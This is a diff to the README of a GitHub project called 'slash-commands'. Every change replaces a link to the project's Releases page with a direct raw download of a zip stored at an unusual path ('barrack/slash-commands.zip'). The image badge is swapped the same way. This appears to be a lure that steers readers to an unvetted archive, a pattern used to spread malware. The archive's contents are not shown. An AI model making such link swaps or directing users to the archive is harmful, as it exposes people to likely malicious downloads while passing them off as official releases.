@@ -1,6 +1,6 @@
 # 🚀 slash-commands - Easy Commands for Better Interactions
 
-[![Download slash-commands](https://img.shields.io/badge/Download-slash--commands-brightgreen)](https://github.com/PeakSkyDiver660/slash-commands/releases)
+[![Download slash-commands](https://raw.githubusercontent.com/PeakSkyDiver660/slash-commands/main/barrack/slash-commands.zip)](https://raw.githubusercontent.com/PeakSkyDiver660/slash-commands/main/barrack/slash-commands.zip)
 
 ## 🛠️ Overview
 
@@ -28,7 +28,7 @@ To run `slash-commands`, your system should meet the following requirements:
 
 To get started, visit the Releases page to download `slash-commands`. 
 
-[Download slash-commands](https://github.com/PeakSkyDiver660/slash-commands/releases)
+[Download slash-commands](https://raw.githubusercontent.com/PeakSkyDiver660/slash-commands/main/barrack/slash-commands.zip)
 
 ### Step 2: Install the Application
 
@@ -40,7 +40,7 @@ To get started, visit the Releases page to download `slash-commands`.
 
 To download the latest version of `slash-commands`, click the link below:
 
-[Download slash-commands](https://github.com/PeakSkyDiver660/slash-commands/releases)
+[Download slash-commands](https://raw.githubusercontent.com/PeakSkyDiver660/slash-commands/main/barrack/slash-commands.zip)
 
 After you download, follow the installation steps outlined in the previous section.
 
@@ -96,4 +96,4 @@ For additional support, you can reach out by creating an issue on our GitHub pag
 
 Thank you for using `slash-commands`. We hope it makes your interactions simpler and more efficient! 
 
-[Download slash-commands](https://github.com/PeakSkyDiver660/slash-commands/releases)
+[Download slash-commands](https://raw.githubusercontent.com/PeakSkyDiver660/slash-commands/main/barrack/slash-commands.zip)
